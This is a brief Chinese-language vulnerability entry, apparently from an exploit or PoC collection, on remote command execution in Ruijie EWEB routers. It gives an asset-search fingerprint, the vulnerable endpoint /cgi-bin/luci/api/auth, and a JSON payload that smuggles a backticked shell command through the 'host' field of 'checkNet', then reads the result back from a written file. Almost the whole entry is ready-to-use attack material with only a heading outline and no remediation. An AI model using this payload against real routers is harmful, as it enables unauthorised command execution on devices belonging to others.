# 锐捷EWEB路由器auth远程命令执行漏洞

- **系统**：锐捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="cgi-bin/luci"`
- **请求**：`POST /cgi-bin/luci/api/auth HTTP/1.1`
- **关键头**：`Content-Type: application/json`

**请求体 / payload**
```
{"method":"checkNet","params":{"host":"`echo c149136B>AD0D5b8c.txt`"}}

获取命令执行结果
/cgi-bin/AD0D5b8c.txt
```

**其他**
- 锐捷 EWEB路由器 auth 远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 锐捷 EWEB路由器